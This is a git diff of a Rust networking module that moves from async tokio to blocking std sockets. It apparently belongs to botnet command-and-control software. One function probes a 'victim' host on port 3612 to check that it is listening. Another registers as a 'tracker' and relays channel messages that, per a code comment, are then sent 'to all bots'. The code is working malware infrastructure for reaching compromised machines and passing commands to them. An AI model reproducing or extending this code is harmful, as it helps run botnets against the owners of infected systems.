@@ -1,10 +1,12 @@
-use tokio::sync::broadcast::Receiver;
-use tokio::{net::TcpStream, io::{BufReader, AsyncWriteExt, AsyncReadExt}};
+use std::io::{BufReader, Read, Write};
+use std::net::TcpStream;
+
+use crossbeam_channel::Receiver;
 
 use crate::Victim;
 
-pub async fn is_victim_listening(victim: &Victim) -> bool {
-    let mut stream = match TcpStream::connect(victim.ip.ip().to_string() + ":3612").await {
+pub fn is_victim_listening(victim: &Victim) -> bool {
+    let mut stream = match TcpStream::connect(victim.ip.ip().to_string() + ":3612") {
         Ok(stream) => stream,
         Err(_) => {
             error!("Failed to connect to {}'s server", victim.ip);
@@ -12,12 +14,12 @@ pub async fn is_victim_listening(victim: &Victim) -> bool {
         }
     };
 
-    if stream.write_all(&[1]).await.is_err() {
+    if stream.write_all(&[1]).is_err() {
         return false;
     }
     let mut buf_reader = BufReader::new(&mut stream);
     let mut buffer: [u8; 1] = [0];
-    if let Err(err) = buf_reader.read_exact(&mut buffer).await {
+    if let Err(err) = buf_reader.read_exact(&mut buffer) {
         error!("Failed to read from {}'s server: {}", victim.ip, err);
         return false;
     }
@@ -28,23 +30,13 @@ pub async fn is_victim_listening(victim: &Victim) -> bool {
     true
 }
 
-pub async fn manage_tracker(_victim: &Victim, stream: &mut TcpStream, mut receiver: Receiver<String>) -> Result<(), Box<dyn std::error::Error>> {
-    stream.write_all(b"tracker\0").await?;
+/// Forwards messages sent to the channel to the tracker that will send it to all bots
+pub fn manage_tracker(_victim: &Victim, stream: &mut TcpStream, receiver: Receiver<&str>) -> Result<(), Box<dyn std::error::Error>> {
+    stream.write_all(b"tracker\0")?;
+    debug!("Managing tracker");
     loop {
-        let message = receiver.recv().await?;
-        stream.write_all(message.as_bytes()).await?;
-        /* let mut buf_reader = BufReader::new(&mut stream);
-        let mut request: Vec<u8> = Vec::new();
-        buf_reader
-            .read_until(0, &mut request).await?;
-
-        let request = std::str::from_utf8(&request)?; */
-        // let content = request.split_once('\n');
-
-        // mean it should propagate the request to all trackers
-        /* if let Some((first, rest)) = content {
-            if first == "PROP" { */
-            /* }
-        } */
+        let message = receiver.recv().unwrap();
+        debug!("Sending message {}", message);
+        stream.write_all(message.as_bytes())?;
     }
 }
